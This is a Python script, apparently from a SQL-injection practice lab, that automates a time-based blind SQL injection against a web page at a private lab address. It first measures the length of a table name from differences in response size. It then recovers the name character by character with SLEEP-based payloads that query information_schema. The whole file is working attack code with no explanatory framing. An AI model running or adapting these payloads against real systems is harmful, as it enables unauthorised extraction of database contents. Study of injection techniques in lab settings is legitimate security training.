import requests
# 基于时间的盲注
#获取数据库中表的名字users

base_url = 'http://192.168.254.147/SQL_injection/low.php? %s &Submit_ID=确认'

def get_table_name(length:int):
    table_name = ""
    content_template =  "id=1 AND IF((ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1,1),%d,1)))=%d,SLEEP(3),0) "
    chars = '_$0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, length + 1):
        for char in chars:
            content = content_template % (i, ord(char))
            url = base_url % content
            # print(url)

            response = requests.get(url)
            # 根据返回时间的不同来判断字符正确与否
            sec = response.elapsed.seconds
            # print(sec)
            if sec > 2:
                table_name += char
                break
    print(table_name)

def get_table_name_length():
    length = 0
    content_template = "id=1 AND (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=%d"

    for i in range(1,64):
        content = content_template % i
        url = base_url % content
        # print (url)
        response = requests.get(url)
        resLen = len(response.text)
        # print(resLen)
        if resLen > 500:
            length = i
            break;
    return length

if __name__ == '__main__':
    length = get_table_name_length()
    get_table_name(length)

